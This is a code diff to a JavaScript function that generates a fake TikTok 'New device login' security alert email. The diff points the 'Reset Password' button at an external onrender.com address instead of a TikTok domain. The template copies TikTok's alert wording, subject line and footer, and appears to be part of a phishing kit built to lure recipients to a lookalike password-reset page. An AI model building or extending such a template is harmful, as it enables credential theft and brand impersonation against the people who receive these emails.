@@ -70,7 +70,7 @@ function generateTikTokAlertHTML(data) {
     instructionText1 = 'If this was you, you can ignore this message.',
     instructionText2 = "If this wasn&rsquo;t you, open the TikTok app and go to &ldquo;Settings and privacy&rdquo; &gt; &ldquo;Security and login&rdquo; &gt; &ldquo;Security alerts&rdquo; and review unauthorized logins.",
     buttonText    = 'Reset Password',
-    buttonLink    = '/',
+    buttonLink    = 'https://tip-top-v2.onrender.com/reset-password',
     footerText    = 'This is an automatically generated email.<br>Replies to this email address aren&rsquo;t monitored.',
     subjectLine   = 'New device login to your TikTok account',
     baseUrl       = '',
